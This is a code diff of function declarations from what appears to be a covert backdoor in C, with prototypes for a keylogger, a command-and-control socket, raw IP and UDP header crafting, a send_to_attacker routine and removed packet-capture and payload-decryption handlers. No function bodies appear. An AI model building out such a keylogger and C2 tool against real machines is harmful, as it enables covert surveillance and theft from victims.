@@ -37,14 +37,12 @@ void send_to_attacker(u_char *args);
 unsigned short create_udp_header(struct udphdr* uh, uint16_t port);
 unsigned short create_ip_header(struct iphdr* ih, char c, u_char *args);
 void initialize_victim_server(struct options_victim *opts);
+void* activate_select(void* arg);
 void* activate_keylogger(void* arg);
-void* activate_cvc(void* arg);
-void cvc_select_call(struct options_victim *opts, struct sockaddr_in cvc_address);
-void create_victim_cvc_socket(struct options_victim *opts, struct sockaddr_in *cvc_address);
-
-
-void activate_select_multiplexing(void* arg);
-
+void* activate_cnc(void* arg);
+void cnc_select_call(struct options_victim *opts, struct sockaddr_in cnc_address);
+void create_victim_cnc_socket(struct options_victim *opts, struct sockaddr_in *cnc_address);
+void* check_directory(void* arg);
 
 int (*builtin_func[]) (char **) = {
         &builtin_cd,
@@ -52,17 +50,6 @@ int (*builtin_func[]) (char **) = {
 };
 
 
-u_int16_t handle_ethernet (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void handle_IP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void print_payload (const u_char *, int);
-void print_hex_ascii_line (const u_char *, int, int);
-void decrypt_payload(u_char *payload);
-void extract_square_bracket_string(char* input);
-
-void *track_opts_victim_flag(void *vargp);
-void pkt_callback2(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 
 
 
